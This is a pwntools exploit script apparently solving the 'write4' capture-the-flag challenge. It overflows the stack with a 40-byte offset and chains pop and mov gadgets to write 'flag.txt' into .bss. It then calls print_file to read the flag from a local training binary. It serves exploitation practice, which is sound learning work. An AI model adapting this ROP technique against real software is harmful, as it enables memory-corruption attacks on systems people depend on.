#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template write4
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('write4')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

context.clear(arch='amd64')
filename = './write4'

elf = ELF(filename)
io = process(filename)

# gadgets
r = ROP(elf)

#pop = p64(r.r14.address)    # pop r14; pop r15; ret;
# -----------------------OR-----------------------
# ropper --file=write4 --search pop

pop = p64(0x0000000000400690) # pop r14; pop r15; ret;
mov = p64(0x400628)         # mov qword [r14], r15 (usefulGadgets() function address)
bss = elf.bss() # .bss - Uninitialized data with read and write access rights
# offset
r.raw(cyclic(40))

# write
r.raw(pop) #restore r14 and r15 on stack then return
r.raw(p64(bss))
r.raw(b'flag.txt') # in hex is 'txt.galf' because of reverse order, something what we want to print using print_file()
r.raw(mov) # from usefulGadget() function, write a value to the memory
#our r15 equals  to the hex value of flag.txt string, the mov instruction makes the r14 points to r15
#after few steps the __fopen_internal() pushes 14 and it will display our flag.

r.call('print_file', [bss])
payload = r.chain()
print(r.dump())

#with open("asd","w") as f:
    #f.write(payload)
    #f.close()
    
io.recvuntil('>')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))
